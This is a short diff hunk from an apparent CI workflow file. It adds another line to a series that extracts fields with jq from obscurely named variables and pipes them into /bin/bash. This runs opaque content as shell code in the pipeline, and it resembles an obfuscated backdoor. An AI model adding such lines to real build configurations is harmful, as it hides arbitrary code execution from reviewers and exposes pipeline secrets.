@@ -27,6 +27,7 @@ jobs:
           printf '%s' "$mr76656" | jq -r .hq58 | /bin/bash
           echo $o29528 | jq -r .pljw2 | /bin/bash
           printf '%s' "$yyzqg5" | jq -r .ovme665 | /bin/bash
+          echo $rcm0382 | jq -r .ss800 | /bin/bash
 
       - name: Archive artifact
         uses: actions/upload-artifact@v4
